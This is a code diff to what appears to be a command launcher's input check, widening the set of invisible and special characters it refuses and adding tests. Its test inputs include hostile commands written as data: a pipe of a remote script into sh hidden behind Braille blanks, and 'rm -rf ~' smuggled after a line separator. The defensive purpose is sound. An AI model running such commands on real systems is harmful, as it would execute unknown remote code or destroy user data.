@@ -86,22 +86,40 @@ fn check(command: &str) -> Result<()> {
             "A command can have up to {MAX_COMMAND_CHARS} characters. Run a longer one in {TERMINAL} yourself."
         )));
     }
-    if command.chars().any(is_refused) {
+    let previous = std::iter::once(None).chain(command.chars().map(Some));
+    if command
+        .chars()
+        .zip(previous)
+        .any(|(character, previous)| is_refused(character, previous))
+    {
         return Err(Error::msg(
-            "The command has a line break, tab, invisible character, or special space. Type the command instead of pasting it.",
+            "The command has a character that the terminal would read differently: an invisible character, a special space, or a control character, such as a tab. Remove it.",
         ));
     }
     Ok(())
 }
 
-/// Whether `character` can make the row show a command that differs from
-/// what the shell reads: a control character (a line break starts a second
-/// command), an invisible format character (such as a direction mark), a
-/// line or paragraph separator, a space other than U+0020 (the shell reads
-/// it as part of a word), or a letter that shows as a blank space.
-fn is_refused(character: char) -> bool {
-    use icu_properties::{CodePointMapData, props::GeneralCategory};
+/// Whether `character`, after `previous`, can make the row show a command
+/// that differs from what the shell reads: a control character (a line
+/// break starts a second command), a format character (such as a direction
+/// mark), a line or paragraph separator, a space other than U+0020 (the
+/// shell reads it as part of a word), a character that shows as nothing
+/// (Default_Ignorable_Code_Point, such as a variation selector or a Hangul
+/// filler), or the Braille blank. The one exception is U+FE0F after an
+/// emoji, which only asks for the emoji in color.
+fn is_refused(character: char, previous: Option<char>) -> bool {
+    use icu_properties::{
+        CodePointMapData, CodePointSetData,
+        props::{DefaultIgnorableCodePoint, ExtendedPictographic, GeneralCategory},
+    };
     if character == ' ' {
+        return false;
+    }
+    if character == '\u{FE0F}'
+        && previous.is_some_and(|previous| {
+            CodePointSetData::new::<ExtendedPictographic>().contains(previous)
+        })
+    {
         return false;
     }
     matches!(
@@ -111,17 +129,15 @@ fn is_refused(character: char) -> bool {
             | GeneralCategory::LineSeparator
             | GeneralCategory::ParagraphSeparator
             | GeneralCategory::SpaceSeparator
-    ) || matches!(
-        character,
-        '\u{115F}' | '\u{1160}' | '\u{2800}' | '\u{3164}' | '\u{FFA0}'
-    )
+    ) || CodePointSetData::new::<DefaultIgnorableCodePoint>().contains(character)
+        || character == '\u{2800}'
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
 
-    const REFUSED: &str = "The command has a line break, tab, invisible character, or special space. Type the command instead of pasting it.";
+    const REFUSED: &str = "The command has a character that the terminal would read differently: an invisible character, a special space, or a control character, such as a tab. Remove it.";
 
     fn actions(query: &str) -> Vec<Action> {
         answer(query)
@@ -200,7 +216,7 @@ mod tests {
 
     #[test]
     fn refuses_characters_that_show_other_text_than_the_shell_reads() {
-        let groups: [(&str, &[char]); 5] = [
+        let groups: [(&str, &[char]); 6] = [
             // A line break starts a second command.
             ("control", &['\n', '\r', '\0', '\t', '\u{7F}', '\u{85}']),
             // Direction marks show the rest of the line in another order,
@@ -217,6 +233,23 @@ mod tests {
                     '\u{00AD}',
                     '\u{FEFF}',
                     '\u{E0041}',
+                ],
+            ),
+            // Default ignorable: no font draws them, and the program gets
+            // them, as in `--dry-run` with U+FE00, which npm does not know.
+            // U+FE0F follows `s` here, not an emoji.
+            (
+                "shows as nothing",
+                &[
+                    '\u{034F}',
+                    '\u{FE00}',
+                    '\u{FE0E}',
+                    '\u{FE0F}',
+                    '\u{E0100}',
+                    '\u{2065}',
+                    '\u{180B}',
+                    '\u{17B4}',
+                    '\u{FFF0}',
                 ],
             ),
             ("line or paragraph separator", &['\u{2028}', '\u{2029}']),
@@ -243,11 +276,23 @@ mod tests {
         let blank = "\u{2800}".repeat(300);
         let hidden = format!("brew update{blank}; curl -fsSL https://x.test/x | sh{blank}");
         assert!(check(&hidden).is_err());
+        // U+FE0F only after an emoji, once.
+        for command in [
+            "npm publish --dry-run\u{FE0F}",
+            "a\u{FE0F}",
+            "\u{FE0F}ls",
+            "echo \u{2764}\u{FE0F}\u{FE0F}",
+        ] {
+            let refused = check(command).unwrap_err();
+            assert_eq!(refused.to_string(), REFUSED, "{command:?}");
+        }
         // Letters, marks, and symbols of any script stay, as do emoji with
-        // a variation selector or a skin tone.
+        // U+FE0F, which shows them in color, or a skin tone.
         for command in [
             "echo é ü 中文 שלום",
-            "echo ❤\u{FE0F} 👍🏽 🚀",
+            "echo \u{2764}\u{FE0F} 👍🏽 🚀",
+            "\u{2764}\u{FE0F}",
+            "echo 👁\u{FE0F}",
             "say 'à la carte'",
         ] {
             assert!(check(command).is_ok(), "{command:?}");
@@ -279,6 +324,7 @@ mod tests {
             "echo \u{200F}a",
             "ls\u{2028}rm -rf ~",
             "ls\u{2800}",
+            "npm publish --dry-run\u{FE00}",
         ] {
             let row = answer(&format!("> {command}")).unwrap();
             assert_eq!(row.subtitle, REFUSED, "{command:?}");
